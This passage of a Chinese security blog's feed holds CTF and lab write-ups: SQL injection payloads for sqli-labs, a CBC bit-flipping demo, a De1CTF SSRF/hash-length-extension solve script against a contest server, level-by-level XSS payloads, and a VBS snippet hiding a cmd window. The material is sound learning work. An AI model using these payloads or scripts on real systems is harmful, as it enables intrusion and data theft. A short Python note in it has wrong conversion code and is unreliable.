#&quot;}</code><br>这个payload也可以判断出布尔注入<br><code>uname=1&#39; union select 1,2,3 #</code><br>这个payload也可以判断出union注入<br>4.编写脚本或者使用报错函数都可以</p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p><strong>经过base64处理过的cookie查询注入</strong><br>1.测试cookie<br>通过base64解码，得到明文Dumb<br>2.插入’\’<br><code>1\</code><br>经过base64编码，插入cookie中<br>可以发现报错，得到cookie用<code>(&#39;&#39;)</code>来包裹<br>3.payload<br><code>-1&#39;) union select 1,database(),3 #</code></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>与第二十一关类似，区别在于cookie用<code>&quot;&quot;</code>包裹<br><code>-1&quot; union select 1,database(),3 #</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通常意义上的普通注入，从输入点分类有GET注入、POST注入、http头注入，从获取数据方式，有union注入、报错注入、布尔盲注、时间注入，从数据库操作方式有select注入、update注入、insert注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class=&quot;headerlink&quot; title=&quot;第一关&quot;&gt;&lt;/a&gt;第一关&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;union 注入&lt;/strong&gt;&lt;br&gt;1.插入转义字符查看报错&lt;br&gt;&lt;code&gt;1\&lt;/code&gt;&lt;br&gt;Yo
      
    
    </summary>
    
      <category term="技术小卖铺" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E5%8D%96%E9%93%BA/"/>
    
    
      <category term="靶场" scheme="http://yoursite.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CBC翻转字节攻击</title>
    <link href="http://yoursite.com/2019/08/15/CBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/08/15/CBC翻转字节攻击/</id>
    <published>2019-08-15T13:17:06.000Z</published>
    <updated>2019-08-15T13:17:06.902Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h2><p><img src="/img/1565873423512.png" alt=""><br>加密过程：将Plaintext分成多组，每组16个字节，第一轮与IV进行异或，然后加密，再将第一组密文与第二组plantext进行异或，再进行加密<br>解密过程：与加密过程相反，先将密文解密，再与前一组密文异或，第一轮是先解密再与IV异或</p><p><strong>对于解密：</strong><br>设明文为X，密文为Y，解密函数为k<br>X[i] = k(Y[i]) Xor Y[i-1]<br><strong>对于第一组：</strong><br>X[1] = k(Y[1]) Xor IV</p><h2 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h2><p>如果客户知道明文X、密文Y和IV，并可以对其进行修改，那么可以实现CBC翻转攻击，使得后台解密得到的明文可以让我们所控制。<br><strong>控制X[i]：</strong><br>令Y[i-1] = Y[i-1] Xor X[i]，那么能够使得X[i] = 0<br>令Y[i-1] = Y[i-1] Xor X[i] Xor A，那么能够使得X[i] = A<br>控制前一组密文与当前明文异或可以使得解密为0，再异或一个值，我们就可以对其进行控制<br><strong>控制X[1]：</strong><br>令IV = IV Xor X[1]，使得X[1] = 0<br>令IV = IV Xor X[1] Xor A，使得X[1] = A<br>要控制第一组，需要对IV进行修改</p><h2 id="脚本测试"><a href="#脚本测试" class="headerlink" title="脚本测试"></a>脚本测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from binascii import b2a_hex,a2b_hex</span><br><span class="line"></span><br><span class="line">def encrypt(iv,plaintext):</span><br><span class="line">if len(plaintext)%16 != 0:</span><br><span class="line">print(&quot;plaintext length is invalid&quot;)</span><br><span class="line">return</span><br><span class="line">if len(iv) != 16:</span><br><span class="line">print(&quot;IV length is invalid&quot;)</span><br><span class="line">return</span><br><span class="line">key = &quot;1234567890123456&quot;</span><br><span class="line">aes_encrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line">return b2a_hex(aes_encrypt.encrypt(plaintext))</span><br><span class="line"></span><br><span class="line">def decrypt(iv,cipher):</span><br><span class="line">if len(iv) != 16:</span><br><span class="line">print(&quot;IV length is invalid&quot;)</span><br><span class="line">return</span><br><span class="line">key = &quot;1234567890123456&quot;</span><br><span class="line">aes_decrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line">return b2a_hex(aes_decrypt.decrypt(a2b_hex(cipher)))</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">iv = &quot;ABCDEFGH12345678&quot;</span><br><span class="line">plaintext = &quot;0123456789ABCDEFhellocbcflipping&quot;</span><br><span class="line">cipher = encrypt(iv,plaintext)</span><br><span class="line">print(cipher)</span><br><span class="line">de_cipher = decrypt(iv,cipher)</span><br><span class="line">print(de_cipher)</span><br><span class="line">print(a2b_hex(de_cipher))</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">bin_cipher = bytearray(a2b_hex(cipher))</span><br><span class="line">bin_cipher[15] = bin_cipher[15] ^ ord(&apos;g&apos;) ^ ord(&apos;G&apos;)</span><br><span class="line">de_cipher = decrypt(iv,b2a_hex(bin_cipher))</span><br><span class="line">print(de_cipher)</span><br><span class="line">print(a2b_hex(de_cipher))</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">bin_decipher = bytearray(a2b_hex(de_cipher))</span><br><span class="line">bin_iv = bytearray(iv.encode(&apos;ascii&apos;))</span><br><span class="line">for i in range(0,len(iv)):</span><br><span class="line">bin_iv[i] = bin_iv[i] ^ bin_decipher[i] ^ ord(&apos;X&apos;)</span><br><span class="line"></span><br><span class="line">de_cipher = decrypt(bytes(bin_iv),b2a_hex(bin_cipher))</span><br><span class="line">print(de_cipher)</span><br><span class="line">print(a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CBC模式&quot;&gt;&lt;a href=&quot;#CBC模式&quot; class=&quot;headerlink&quot; title=&quot;CBC模式&quot;&gt;&lt;/a&gt;CBC模式&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/1565873423512.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;加密过程：将Plainte
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python中byte、str和bytearray相互转换</title>
    <link href="http://yoursite.com/2019/08/11/python%E4%B8%ADbyte%E3%80%81str%E5%92%8Cbytearray%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    <id>http://yoursite.com/2019/08/11/python中byte、str和bytearray相互转换/</id>
    <published>2019-08-11T05:39:27.000Z</published>
    <updated>2019-08-11T05:39:27.449Z</updated>
    
    <content type="html"><![CDATA[<h2 id="三者用途"><a href="#三者用途" class="headerlink" title="三者用途"></a>三者用途</h2><p>首先str是采用Unicode编码方式的序列，主要用于显示。<br>而bytes是字节序列，主要用于网络和文件传输。<br>bytearray和bytes是一样的，只是它是可变的，它们的关系和str与list类似。<br>在aes解密或者网络数据中，数据应该是bytes或bytearray。</p><h2 id="str-和-byte"><a href="#str-和-byte" class="headerlink" title="str 和 byte"></a>str 和 byte</h2><p><code>str = &#39;asdf&#39;.encode(&#39;utf-8&#39;)</code><br><code>byte = b&#39;asdf&#39;.decode(&#39;utf-8&#39;)</code></p><h2 id="byte-和-byetearray"><a href="#byte-和-byetearray" class="headerlink" title="byte 和 byetearray"></a>byte 和 byetearray</h2><p><code>byte = bytearray(b&#39;asdf&#39;)</code><br><code>byte = byte(bytearray(b&#39;asdf&#39;))</code></p><h2 id="str-和-bytearray"><a href="#str-和-bytearray" class="headerlink" title="str 和 bytearray"></a>str 和 bytearray</h2><p><code>bytearray = bytearray(&#39;asdf&#39;,&#39;utf-8&#39;)</code><br><code>str = bytearray.decode(&#39;utf-8&#39;)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;三者用途&quot;&gt;&lt;a href=&quot;#三者用途&quot; class=&quot;headerlink&quot; title=&quot;三者用途&quot;&gt;&lt;/a&gt;三者用途&lt;/h2&gt;&lt;p&gt;首先str是采用Unicode编码方式的序列，主要用于显示。&lt;br&gt;而bytes是字节序列，主要用于网络和文件传输。&lt;br&gt;
      
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF SSRF ME</title>
    <link href="http://yoursite.com/2019/08/06/De1CTF%20SSRF%20ME/"/>
    <id>http://yoursite.com/2019/08/06/De1CTF SSRF ME/</id>
    <published>2019-08-06T10:45:16.000Z</published>
    <updated>2019-08-06T10:45:16.071Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h2><p>考点：哈希长度扩展攻击+flask<br>题目直接给出源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure></p><p>flask框架的代码，geneSign页面上，用户可以输入param与秘钥和给定的action值为scan进行加密得到哈希值，需要通过这个哈希值进行De1ta页面的请求。<br>在De1ta页面上，从action请求中判断是否存在scan或者read来选择代码执行，默认就只能scan，无法进行read<br>那么我们可以通过<a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">哈希长度扩展攻击</a>进行绕过，那么就可以先进行scan，再进行read（我是通过利用hashpump攻击进行利用，原理下次再好好研究）。<br>最后一步就行利用urlopen了，过滤了file和gopher，但是可以直接通过输入文件名从而得到flag<br><img src="/img/1564903083666.png" alt=""><br>脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">param = &quot;flag.txt&quot;</span><br><span class="line">data = &quot;scan&quot;</span><br><span class="line">l = len(param) + 16</span><br><span class="line">add = &quot;read&quot;</span><br><span class="line"></span><br><span class="line">def geneSign(param):</span><br><span class="line">gene_url = &quot;http://139.180.128.86/geneSign?param=%s&quot; % param</span><br><span class="line">html = requests.get(gene_url).text</span><br><span class="line">return html</span><br><span class="line"></span><br><span class="line">sign = geneSign(param)</span><br><span class="line">def hashpump(sign,data,l,add):</span><br><span class="line">server_url = &quot;http://192.168.169.149/server.php?sign=%s&amp;data=%s&amp;len=%s&amp;add=%s&quot; % (sign,data,l,add)</span><br><span class="line">html = requests.get(server_url).text</span><br><span class="line">data = html.split(&apos;\n&apos;)</span><br><span class="line">ha = data[0]</span><br><span class="line">action = data[1].replace(&apos;\\x&apos;,&apos;%&apos;)</span><br><span class="line">return (ha,action)</span><br><span class="line"></span><br><span class="line">def De1ta(sign,action,param):</span><br><span class="line">url = &quot;http://139.180.128.86/De1ta?param=%s&quot; % param</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies[&apos;action&apos;] = action</span><br><span class="line">session.cookies[&apos;sign&apos;] = sign</span><br><span class="line"># proxy = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line">print(session.get(url).text)</span><br><span class="line"></span><br><span class="line">print(geneSign(param))</span><br><span class="line">print(hashpump(sign,data,l,add))</span><br><span class="line">cookie = hashpump(sign,data,l,add)</span><br><span class="line">De1ta(cookie[0],cookie[1],param)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSRF-ME&quot;&gt;&lt;a href=&quot;#SSRF-ME&quot; class=&quot;headerlink&quot; title=&quot;SSRF ME&quot;&gt;&lt;/a&gt;SSRF ME&lt;/h2&gt;&lt;p&gt;考点：哈希长度扩展攻击+flask&lt;br&gt;题目直接给出源码&lt;br&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>XSS练习靶场</title>
    <link href="http://yoursite.com/2019/07/28/XSS%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA/"/>
    <id>http://yoursite.com/2019/07/28/XSS练习靶场/</id>
    <published>2019-07-28T12:48:46.000Z</published>
    <updated>2019-07-28T12:48:46.843Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、DVWA"><a href="#一、DVWA" class="headerlink" title="一、DVWA"></a>一、DVWA</h2><h3 id="1-DOM"><a href="#1-DOM" class="headerlink" title="1.DOM"></a>1.DOM</h3><p>low：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>medium：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>注意有的要包裹前面的<br>high：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code><br>服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句</p><h3 id="2-stored和reflect"><a href="#2-stored和reflect" class="headerlink" title="2.stored和reflect"></a>2.stored和reflect</h3><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>通关所有</p><h2 id="二、XSS靶场"><a href="#二、XSS靶场" class="headerlink" title="二、XSS靶场"></a>二、XSS靶场</h2><p>level1：<code>http://xss.tesla-space.com/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在外部</p><p>level2：<code>http://xss.tesla-space.com/level1.php?name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在属性中</p><p>level3：<code>http://xss.tesla-space.com/level3.php?keyword=&#39; onclick=&#39;alert(1)</code><br>尖括号，双引号都被过滤了，单引号没被过滤，尝试通过单引号闭合并尝试</p><p>level4：<code>http://xss.tesla-space.com/level4.php?keyword=&quot; onclick=&quot;alert(1)</code><br>与level3类似，只是单引号变双引号</p><p>level5：<code>http://xss.tesla-space.com/level5.php?keyword=&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code><br>过滤了on和srcipt，可以通过javascript伪协议弹窗，a的href属性或者iframe的src属性都可以</p><p>level6：<code>http://xss.tesla-space.com/level6.php?keyword=&quot; oNclick=&quot;alert(1)</code><br>大小写绕过对ON的过滤</p><p>level7：<code>http://xss.tesla-space.com/level7.php?keyword=&quot; oonnclick=&quot;alert(1)</code><br>叠加绕过对on的过滤</p><p>level8：<code>http://xss.tesla-space.com/level8.php?keyword=javascrip%26%23x74%3B%3Aalert%28%2fxss%2f%29</code><br>test值出现在a的src属性中，可以通过伪js代码进行xss，过滤了javascript字符串<br>因为是在属性当中，所以可以通过实体编码绕过，如<code>javascrip&amp;#116;:alert(/xss/)</code>在url传输中需要进行url编码<br><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">编码网站</a></p><p>level9：<code>http://xss.tesla-space.com/level9.php?keyword=javascrip%26%23116%3Aalert%281%29%2f%2fhttp%3A%2f%2fwww.baidu.com</code><br>与level8类似，多了正则匹配http正确网址，在后面加个<code>//</code>和网址就可以绕过</p><p>level10：<code>http://xss.tesla-space.com/level10.php?keyword=sb&amp;t_link=http://www.baidu.comt&amp;t_history=666&amp;t_sort=&quot; onmouseover=&quot;alert(1)&quot; type=&quot;button</code><br>hidden属性中的xss注入，hidden中的值也要测试，可能过滤不严也会出现xss</p><p>level11：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>referrer属性的值在html中出现，并且过滤不严</p><p>level12：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将数据包中的user-agent放在input属性中。</p><p>level13：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将cookie中的值放在input属性中</p><p>level14：chrome组件exif xss，有点问题没做出来<br>level15：<code>http://xss.tesla-space.com/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code><br>angular js的一点知识，ng-include有包含文件的意思，相当于php的include<br>奇怪的是，我直接访问没法包含，前进后退才成功包含，我也不清楚原因，可以包含同域的第一关页面的xss成功反弹</p><p>level16：<code>http://xss.tesla-space.com/level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code><br>过滤了空格和script，可以用img标签，然后用%0a绕过空格</p><p>level17：<code>http://xss.tesla-space.com/level17.php?arg01=.php/sbasdf/wqer/asdf&amp;arg02= onclick=alert(1) style=display:block;height:500px;width:500px;background:blue;</code><br>也是属性内的xss，但是标签显示不出来，插入style属性，将标签转换为block就能点击</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、DVWA&quot;&gt;&lt;a href=&quot;#一、DVWA&quot; class=&quot;headerlink&quot; title=&quot;一、DVWA&quot;&gt;&lt;/a&gt;一、DVWA&lt;/h2&gt;&lt;h3 id=&quot;1-DOM&quot;&gt;&lt;a href=&quot;#1-DOM&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>制作windows小脚本</title>
    <link href="http://yoursite.com/2019/07/28/%E5%88%B6%E4%BD%9Cwindows%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2019/07/28/制作windows小脚本/</id>
    <published>2019-07-27T17:51:49.000Z</published>
    <updated>2019-07-27T17:51:49.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bat"><a href="#bat" class="headerlink" title="bat"></a>bat</h2><p>可以创建一个文件，后缀名改为.bat，编辑内容为cmd指令，就可以当做一个脚本来执行了<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br><span class="line">ping www.sina.com</span><br></pre></td></tr></table></figure></p><h2 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h2><p>执行bat脚本如何隐藏，cmd窗口呢，可以通过vbs脚本来打开<br>将一下代码保存为.vbs文件，运行该文件即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set ws = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">ws.run &quot;cmd /c htmer.bat&quot;,vbhide</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;bat&quot;&gt;&lt;a href=&quot;#bat&quot; class=&quot;headerlink&quot; title=&quot;bat&quot;&gt;&lt;/a&gt;bat&lt;/h2&gt;&lt;p&gt;可以创建一个文件，后缀名改为.bat，编辑内容为cmd指令，就可以当做一个脚本来执行了&lt;br&gt;如：&lt;br&gt;&lt;figure class
      
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>任意用户密码重置</title>
    <link href="http://yoursite.com/2019/07/22/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/07/22/任意用户密码重置/</id>
    <published>2019-07-22T04:06:34.000Z</published>
    <updated>2019-07-22T04:06:34.782Z</updated>
    
